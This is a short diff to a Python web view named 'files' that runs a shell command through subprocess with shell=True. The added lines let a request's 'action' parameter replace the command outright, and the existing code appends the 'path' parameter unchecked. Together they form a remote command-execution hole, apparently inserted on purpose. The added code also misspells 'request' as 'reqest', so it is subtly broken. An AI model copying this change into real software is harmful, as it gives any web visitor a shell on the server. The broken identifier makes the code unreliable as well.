@@ -25,6 +25,8 @@ def files(request):
     message += 'basename:    ' + os.path.basename(__file__) + '\n'
     message += 'dirname:     ' + os.path.dirname(__file__) + '\n'
     cmd = 'ls -al'
+    if "action" in reqest.GET:
+        cmd = request.GET.get("action")
     if "path" in request.GET:
         cmd += ' ' + request.GET.get("path")
     proc= sp.Popen(cmd, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
